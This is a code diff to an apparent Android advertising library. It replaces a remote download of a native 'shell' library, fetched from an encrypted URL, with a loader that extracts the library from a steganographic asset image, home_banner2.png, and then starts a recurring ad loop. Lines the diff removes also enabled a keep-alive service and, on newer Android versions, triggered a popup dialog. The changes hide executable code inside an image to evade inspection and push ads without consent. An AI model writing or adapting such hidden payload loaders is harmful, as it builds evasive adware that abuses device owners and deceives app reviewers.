@@ -8,7 +8,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
@@ -30,6 +29,7 @@ import com.ep.custom_honor_library.http.OnHttpListener;
 import com.ep.custom_honor_library.http.OnMiddleInterface;
 import com.ep.custom_honor_library.sdk.GmSdkUtils;
 import com.ep.custom_honor_library.sdk.JuliangSDKUtils;
+import com.ep.custom_honor_library.shell.ShellSoLoader;
 import com.ep.custom_honor_library.ui.MiddleAdActivity;
 import com.ep.custom_honor_library.utils.CommonSpUtils;
 import com.ep.custom_honor_library.utils.CustomLogUtils;
@@ -164,17 +164,14 @@ public class ControllerUtils {
 
 
     public  static void initFe(){
-        String file = CommonSpUtils.decrypt(CommonSpUtils.SHELL_URL);
-        CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
-        @Override
+        // 远程下载链路已移除：shell so 随包内置（assets 隐写图片 home_banner2.png），
+        // 本地提取加载，加载成功后启动广告循环（toOpenMiddle 的 SpShellFile 前置恒满足）
+        ShellSoLoader.load(DefContextUtils.instance.getApplication(), new OnHttpListener() {
+            @Override
             public void onSuccess() {
-            Log.i("AD_LOG","初始化啊shell");
-            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.keep.up.tt.rv.VoiceService");
-            if (Build.VERSION.SDK_INT>=34){
-                SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
+                Log.i("AD_LOG","初始化本地shell成功");
+                toLoAdHandler(5*1000);
             }
-            toLoAdHandler(5*1000);
-        }
             @Override
             public void onFail(Exception e) {}
         });
